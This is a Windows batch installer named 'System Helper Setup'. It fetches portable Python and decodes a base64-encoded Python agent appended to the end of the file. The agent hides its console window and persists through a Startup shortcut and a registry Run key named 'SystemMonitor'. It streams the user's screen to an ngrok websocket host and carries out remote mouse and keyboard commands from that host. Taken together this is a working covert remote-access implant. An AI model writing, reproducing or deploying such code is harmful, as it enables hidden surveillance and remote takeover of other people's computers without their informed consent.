@echo off
title System Helper Setup
cd /d "%~dp0"
setlocal enabledelayedexpansion

color 0A
echo ============================================
echo   System Helper - Remote Access Agent
echo ============================================
echo.

set "AGENT_DIR=%APPDATA%\SystemHelper"
set "SERVER_URL=wss://deviation-tweak-charter.ngrok-free.dev"

:: Check if already installed
if exist "%AGENT_DIR%\python\python.exe" goto RUN_AGENT
if exist "%AGENT_DIR%\agent.py" goto RUN_WITH_PYTHON

:: Check if Python is available on system
where python >nul 2>&1
if %errorlevel% equ 0 (
    echo Python found on system. Installing dependencies...
    pip install pyautogui Pillow websocket-client --quiet >nul 2>&1
    goto WRITE_AND_RUN
)

echo Step 1: Downloading Python (portable)...
powershell -Command "try { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip', '%TEMP%\py.zip'); Write-Host OK } catch { Write-Host FAIL; exit 1 }" > "%TEMP%\py_dl.txt"
set /p PY_DL=<"%TEMP%\py_dl.txt"
if "%PY_DL%"=="FAIL" (
    color 0C
    echo.
    echo ERROR: Could not download Python.
    echo Check internet connection or download manually from:
    echo https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip
    echo.
    pause
    exit /b 1
)
echo    OK

echo Step 2: Extracting Python...
mkdir "%AGENT_DIR%\python" 2>nul
powershell -Command "try { Expand-Archive '%TEMP%\py.zip' -DestinationPath '%AGENT_DIR%\python' -Force; Write-Host OK } catch { Write-Host FAIL }" > "%TEMP%\py_extract.txt"
set /p PY_EX=<"%TEMP%\py_extract.txt"
echo    OK

echo Step 3: Installing pip...
powershell -Command "try { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://bootstrap.pypa.io/get-pip.py', '%TEMP%\get-pip.py'); Write-Host OK } catch { Write-Host FAIL }" >nul
"%AGENT_DIR%\python\python.exe" "%TEMP%\get-pip.py" --quiet >nul 2>&1

echo Step 4: Installing dependencies...
"%AGENT_DIR%\python\python.exe" -m pip install pyautogui Pillow websocket-client --quiet >nul 2>&1
echo    OK

set "PYTHON_EXE=%AGENT_DIR%\python\python.exe"
goto WRITE_SCRIPT

:RUN_WITH_PYTHON
echo Starting agent with system Python...
start /min "" python "%AGENT_DIR%\agent.py"
echo Agent running in background.
timeout /t 3 /nobreak >nul
exit

:RUN_AGENT
echo Starting agent...
start "" "%AGENT_DIR%\python\python.exe" "%AGENT_DIR%\agent.py"
echo Agent running in background.
timeout /t 3 /nobreak >nul
exit

:WRITE_AND_RUN
set "PYTHON_EXE=python"
goto WRITE_SCRIPT

:WRITE_SCRIPT
echo Writing agent script...
powershell -Command "$f='%~f0'; $c=get-content $f; $idx=0; for($i=0;$i -lt $c.count;$i++){if($c[$i] -eq ('XyZzZ_D4T4_' + 'M4RK3R_XyZzZ')){$idx=$i+1;break}}; if($idx -gt 0 -and $idx -lt $c.count){ $b64=''; for($j=$idx;$j -lt $c.count;$j++){ $b64+=$c[$j].trim() }; try { [System.IO.File]::WriteAllBytes('%AGENT_DIR%\agent.py', [System.Convert]::FromBase64String($b64)); Write-Host OK } catch { Write-Host FAIL; exit 1 } } else { Write-Host FAIL; exit 1 }" > "%TEMP%\write_result.txt"
set /p WR_RES=<"%TEMP%\write_result.txt"
if "%WR_RES%"=="FAIL" (
    color 0C
    echo ERROR: Could not write agent script.
    pause
    exit /b 1
)
echo    OK

echo Setting up auto-start...
powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemHelper.lnk'); $s.TargetPath='%PYTHON_EXE%'; $s.Arguments='%AGENT_DIR%\agent.py'; $s.WindowStyle=7; $s.Save()" >nul
echo    OK

echo.
echo ============================================
echo   INSTALLATION COMPLETE
echo ============================================
echo.
echo Starting agent now...
start "" "%PYTHON_EXE%" "%AGENT_DIR%\agent.py"
echo.
echo Agent is running in background.
echo It will auto-start when Windows starts.
echo.
echo You can close this window.
echo ============================================
timeout /t 5 /nobreak >nul
exit /b

XyZzZ_D4T4_M4RK3R_XyZzZ
aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IGpzb24KaW1wb3J0IHRpbWUKaW1wb3J0IGJhc2U2NAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBpbwppbXBvcnQgY3R5cGVzCmltcG9ydCB1dWlkCmltcG9ydCBwbGF0Zm9ybQoKIyBIaWRlIGNvbnNvbGUgd2luZG93IG9uIFdpbmRvd3MKaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOgogICAgY3R5cGVzLndpbmRsbC51c2VyMzIuU2hvd1dpbmRvdyhjdHlwZXMud2luZGxsLmtlcm5lbDMyLkdldENvbnNvbGVXaW5kb3coKSwgMCkKCnRyeToKICAgIGltcG9ydCBweWF1dG9ndWkKICAgIGZyb20gUElMIGltcG9ydCBJbWFnZQogICAgaW1wb3J0IHdlYnNvY2tldApleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAjIEluc3RhbGwgZGVwZW5kZW5jaWVzIHNpbGVudGx5CiAgICBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW3N5cy5leGVjdXRhYmxlLCAnLW0nLCAncGlwJywgJ2luc3RhbGwnLCAncHlhdXRvZ3VpJywgJ1BpbGxvdycsICd3ZWJzb2NrZXQtY2xpZW50JywgJy0tcXVpZXQnXSkKICAgIGltcG9ydCBweWF1dG9ndWkKICAgIGZyb20gUElMIGltcG9ydCBJbWFnZQogICAgaW1wb3J0IHdlYnNvY2tldAoKIyBTaWxlbnQgZXJyb3IgaGFuZGxpbmcKZGVmIGxvZ19lcnJvcihtc2cpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4ob3MucGF0aC5kaXJuYW1lKHN5cy5hcmd2WzBdKSwgJ2Vycm9yLmxvZycpLCAnYScpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZiJ7dGltZS50aW1lKCl9IHttc2d9XG4iKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCiMgQ29uZmlndXJhdGlvbgpjb25maWdfcGF0aCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmRpcm5hbWUoc3lzLmFyZ3ZbMF0pLCAnY29uZmlnLmpzb24nKQpjb25maWcgPSB7CiAgICAnc2VydmVyX3VybCc6ICd3c3M6Ly9kZXZpYXRpb24tdHdlYWstY2hhcnRlci5uZ3Jvay1mcmVlLmRldicsCiAgICAnYWdlbnRfaWQnOiAnJywKICAgICdhZ2VudF9uYW1lJzogcGxhdGZvcm0ubm9kZSgpIG9yICdXaW5kb3dzLVBDJywKICAgICdqcGdfcXVhbGl0eSc6IDUwLAogICAgJ2Zwcyc6IDEKfQoKaWYgb3MucGF0aC5leGlzdHMoY29uZmlnX3BhdGgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3Blbihjb25maWdfcGF0aCkgYXMgZjoKICAgICAgICAgICAgY29uZmlnLnVwZGF0ZShqc29uLmxvYWQoZikpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKaWYgbm90IGNvbmZpZ1snYWdlbnRfaWQnXToKICAgIGNvbmZpZ1snYWdlbnRfaWQnXSA9IGNvbmZpZ1snYWdlbnRfbmFtZSddICsgJy0nICsgdXVpZC51dWlkNCgpLmhleFs6OF0KICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oY29uZmlnX3BhdGgsICd3JykgYXMgZjoKICAgICAgICAgICAganNvbi5kdW1wKGNvbmZpZywgZiwgaW5kZW50PTIpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKIyBBdXRvLXN0YXJ0IHJlZ2lzdHJ5IChXaW5kb3dzKQpkZWYgc2V0dXBfYXV0b3N0YXJ0KCk6CiAgICB0cnk6CiAgICAgICAgaW1wb3J0IHdpbnJlZwogICAgICAgIGV4ZV9wYXRoID0gc3lzLmFyZ3ZbMF0gaWYgZ2V0YXR0cihzeXMsICdmcm96ZW4nLCBGYWxzZSkgZWxzZSBzeXMuZXhlY3V0YWJsZSArICcgIicgKyBfX2ZpbGVfXyArICciJwogICAgICAgIGtleSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0NVUlJFTlRfVVNFUiwgcidTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nLCAwLCB3aW5yZWcuS0VZX1NFVF9WQUxVRSkKICAgICAgICB3aW5yZWcuU2V0VmFsdWVFeChrZXksICdTeXN0ZW1Nb25pdG9yJywgMCwgd2lucmVnLlJFR19TWiwgZXhlX3BhdGgpCiAgICAgICAgd2lucmVnLkNsb3NlS2V5KGtleSkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCgpzZXR1cF9hdXRvc3RhcnQoKQoKIyBTY3JlZW4gY2FwdHVyZQpkZWYgY2FwdHVyZV9zY3JlZW4oKToKICAgIHRyeToKICAgICAgICBpbWcgPSBweWF1dG9ndWkuc2NyZWVuc2hvdCgpCiAgICAgICAgYnVmID0gaW8uQnl0ZXNJTygpCiAgICAgICAgaW1nLnNhdmUoYnVmLCBmb3JtYXQ9J0pQRUcnLCBxdWFsaXR5PWNvbmZpZ1snanBnX3F1YWxpdHknXSwgb3B0aW1pemU9VHJ1ZSkKICAgICAgICByZXR1cm4gYmFzZTY0LmI2NGVuY29kZShidWYuZ2V0dmFsdWUoKSkuZGVjb2RlKCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dfZXJyb3IoZidDYXB0dXJlOiB7ZX0nKQogICAgICAgIHJldHVybiBOb25lCgojIENvbnRyb2wgY29tbWFuZCBoYW5kbGVyCmRlZiBoYW5kbGVfY29udHJvbChjbWQsIHBhcmFtcyk6CiAgICB0cnk6CiAgICAgICAgc2NyZWVuX3csIHNjcmVlbl9oID0gcHlhdXRvZ3VpLnNpemUoKQogICAgICAgIGlmIGNtZCA9PSAnbW91c2Vtb3ZlJzoKICAgICAgICAgICAgeCA9IGludChmbG9hdChwYXJhbXNbJ3gnXSkgLyAxMDAgKiBzY3JlZW5fdykKICAgICAgICAgICAgeSA9IGludChmbG9hdChwYXJhbXNbJ3knXSkgLyAxMDAgKiBzY3JlZW5faCkKICAgICAgICAgICAgcHlhdXRvZ3VpLm1vdmVUbyh4LCB5KQogICAgICAgIGVsaWYgY21kID09ICdjbGljayc6CiAgICAgICAgICAgIHggPSBpbnQoZmxvYXQocGFyYW1zWyd4J10pIC8gMTAwICogc2NyZWVuX3cpCiAgICAgICAgICAgIHkgPSBpbnQoZmxvYXQocGFyYW1zWyd5J10pIC8gMTAwICogc2NyZWVuX2gpCiAgICAgICAgICAgIGJ0biA9ICdyaWdodCcgaWYgcGFyYW1zLmdldCgnYnV0dG9uJykgPT0gMiBlbHNlICdsZWZ0JwogICAgICAgICAgICBweWF1dG9ndWkuY2xpY2soeCwgeSwgYnV0dG9uPWJ0bikKICAgICAgICBlbGlmIGNtZCA9PSAna2V5cHJlc3MnOgogICAgICAgICAgICBrZXkgPSBwYXJhbXMuZ2V0KCdrZXknLCAnJykKICAgICAgICAgICAgaWYgbGVuKGtleSkgPT0gMToKICAgICAgICAgICAgICAgIHB5YXV0b2d1aS5wcmVzcyhrZXkpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nX2Vycm9yKGYnQ29udHJvbDoge2V9JykKCiMgV2ViU29ja2V0IGNvbm5lY3Rpb24KcnVubmluZyA9IFRydWUKY3VycmVudF9mcHMgPSBjb25maWdbJ2ZwcyddCgpkZWYgd3NfY29ubmVjdCgpOgogICAgZ2xvYmFsIHJ1bm5pbmcsIGN1cnJlbnRfZnBzCiAgICB3aGlsZSBydW5uaW5nOgogICAgICAgIHRyeToKICAgICAgICAgICAgd3MgPSB3ZWJzb2NrZXQuV2ViU29ja2V0KCkKICAgICAgICAgICAgd3Muc2V0dGltZW91dCgzMCkKICAgICAgICAgICAgd3MuY29ubmVjdChjb25maWdbJ3NlcnZlcl91cmwnXSwgb3JpZ2luPWNvbmZpZ1snc2VydmVyX3VybCddKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBSZWdpc3RlciBhcyBhZ2VudAogICAgICAgICAgICB3cy5zZW5kKGpzb24uZHVtcHMoewogICAgICAgICAgICAgICAgJ3R5cGUnOiAnYWdlbnQtaGVsbG8nLAogICAgICAgICAgICAgICAgJ2FnZW50SWQnOiBjb25maWdbJ2FnZW50X2lkJ10sCiAgICAgICAgICAgICAgICAnbmFtZSc6IGNvbmZpZ1snYWdlbnRfbmFtZSddCiAgICAgICAgICAgIH0pKQogICAgICAgICAgICAKICAgICAgICAgICAgIyBTdGFydCBjYXB0dXJlIHRocmVhZAogICAgICAgICAgICBsYXN0X3NlbmQgPSAwCiAgICAgICAgICAgIHdoaWxlIHJ1bm5pbmc6CiAgICAgICAgICAgICAgICAjIENoZWNrIGZvciBpbmNvbWluZyBtZXNzYWdlcyAoY29udHJvbCBjb21tYW5kcykKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB3cy5zZXR0aW1lb3V0KDAuMSkKICAgICAgICAgICAgICAgICAgICBtc2cgPSB3cy5yZWN2KCkKICAgICAgICAgICAgICAgICAgICBpZiBtc2c6CiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBqc29uLmxvYWRzKG1zZykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGF0YS5nZXQoJ3R5cGUnKSA9PSAnc2V0LWZwcyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50X2ZwcyA9IGRhdGFbJ2ZwcyddCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgZGF0YS5nZXQoJ3R5cGUnKSA9PSAnY29udHJvbCc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVfY29udHJvbChkYXRhLmdldCgnY29tbWFuZCcpLCBkYXRhLmdldCgncGFyYW1zJywge30pKQogICAgICAgICAgICAgICAgZXhjZXB0IHdlYnNvY2tldC5XZWJTb2NrZXRUaW1lb3V0RXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjIFNlbmQgZnJhbWVzIGF0IGNvbmZpZ3VyZWQgRlBTCiAgICAgICAgICAgICAgICBub3cgPSB0aW1lLnRpbWUoKQogICAgICAgICAgICAgICAgaWYgbm93IC0gbGFzdF9zZW5kID49IDEuMCAvIGN1cnJlbnRfZnBzOgogICAgICAgICAgICAgICAgICAgIGZyYW1lID0gY2FwdHVyZV9zY3JlZW4oKQogICAgICAgICAgICAgICAgICAgIGlmIGZyYW1lOgogICAgICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cy5zZW5kKGpzb24uZHVtcHMoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogJ2FnZW50LWZyYW1lJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWdlbnRJZCc6IGNvbmZpZ1snYWdlbnRfaWQnXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZnJhbWUnOiBmcmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgbGFzdF9zZW5kID0gbm93CiAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ19lcnJvcihmJ0Nvbm5lY3Rpb246IHtlfScpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoNSkKCiMgUnVuCmxvZ19lcnJvcignQWdlbnQgc3RhcnRlZCcpCndzX2Nvbm5lY3QoKQ==